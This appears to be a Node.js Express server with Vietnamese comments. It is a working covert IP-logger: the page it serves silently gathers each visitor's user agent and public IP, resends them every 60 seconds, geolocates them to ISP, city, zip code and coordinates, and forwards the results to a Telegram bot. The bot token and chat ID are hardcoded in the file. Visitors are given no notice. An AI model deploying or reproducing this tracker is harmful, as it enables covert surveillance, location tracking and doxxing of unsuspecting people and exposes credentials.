const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Telegram bot info
const BOT_TOKEN = '7903084653:AAFzYR7ZWNK7Zq_elua_tB1fksolyTtzoK8';
const CHAT_ID = '5085998678'; // ← Thay bằng chat_id thực của bạn

app.use(bodyParser.json());

app.get('/', (req, res) => {
  // Trả về trang HTML với script tự động gửi thông tin
  res.send(`
<!DOCTYPE html>
<html>
  <head><title>Auto Tracker</title></head>
  <body>
    <h2>Đang lấy thông tin...</h2>
    <script>
      async function sendInfo() {
        const userAgent = navigator.userAgent;
        const response = await fetch('https://api.ipify.org?format=json');
        const ipData = await response.json();

        const info = {
          userAgent,
          ip: ipData.ip,
          timestamp: new Date().toISOString()
        };

        fetch('/track', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(info)
        });
      }

      sendInfo(); // Gửi ngay lần đầu
      setInterval(sendInfo, 60000); // Gửi mỗi 60 giây
    </script>
  </body>
</html>
  `);
});

app.post('/track', async (req, res) => {
  try {
    const { userAgent, ip, timestamp } = req.body;

    // Phân tích thiết bị
    const parser = new UAParser(userAgent);
    const device = parser.getDevice();
    const phone = device.model ? `${device.vendor || ''} ${device.model}`.trim() : 'PC / Laptop';

    // Lấy địa chỉ IP chi tiết
    const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
    const isp = ipInfo.data.isp || 'Unknown';
    const city = ipInfo.data.city || 'Unknown';
    const country = ipInfo.data.country || 'Unknown';
    const zip = ipInfo.data.zip || 'Unknown';
    const lat = ipInfo.data.lat || 'Unknown';
    const lon = ipInfo.data.lon || 'Unknown';
    const timezone = ipInfo.data.timezone || 'Unknown';

    // Soạn nội dung gửi Telegram
    const message = `
📥 Auto IP Tracking
IP: ${ip}
Thiết bị: ${phone}
ISP: ${isp}
Vị trí: ${city}, ${country}, ${zip}
Tọa độ: ${lat}, ${lon}
Thời gian: ${timestamp} (${timezone})
    `.trim();

    // Gửi về Telegram
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.status(200).send('Đã gửi về Telegram');
  } catch (err) {
    console.error(err.message);
    res.status(500).send('Lỗi khi xử lý thông tin');
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server đang chạy tại http://localhost:${PORT}`);
});


// code này là lấy IP và các thông tin liên quan của người dùng trả về bot telegram liên tục 60s/lần